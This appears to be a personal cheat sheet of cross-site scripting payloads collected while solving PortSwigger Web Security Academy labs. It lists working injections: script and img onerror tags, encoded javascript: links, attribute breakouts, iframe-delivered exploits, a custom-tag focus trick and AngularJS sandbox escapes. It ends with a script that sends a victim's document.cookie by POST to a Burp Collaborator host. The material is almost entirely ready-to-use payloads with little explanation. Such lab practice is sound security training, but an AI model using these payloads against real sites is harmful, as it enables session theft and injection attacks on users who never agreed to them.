<script>alert(document.domain)</script>
<img src=1 onerror=alert(document.domain)>

<img src=x onerror="&#x61;lert(1)">

<a href="javascript&#00000000000058;alert(1)">Click me</a>

"\u0061lert(1)"
"\x61lert"
<a href="javascript\u{0000000003a}alert(1)">Click me</a>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

<iframe src="https://0aeb00f103c39b528042766700030070.web-security-academy.net/?search=%3Cwhatever%2Fonresize%3D%27var+a%3Dalert%3Ba%28document.cookie%29%27+width%3D%27200px%27+height%3D%27400px%27%3E" onload="this.style.width='100px'"></iframe>

XSS in HTML tag attributes :
    " autofocus onfocus=alert(document.domain) x="

Reflected XSS in canonical link tag :
    <input type="hidden" accesskey="X" onclick="alert(1)">


Custom HTML tag :
    TO EMBED : 
        <script>
            location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
        </script>
    The custom TAG :
        <xss id=x onfocus=alert(document.cookie) tabindex=1>#x

Angular : ( ng-app directive )
    {{$on.constructor('alert(1)')()}}
    "ng-click="$event.view.alert(1)"

Reprendre les titres des contexts des XSS

Retrieve cookies and send to remote server :
    <script>
        fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
        });
    </script>

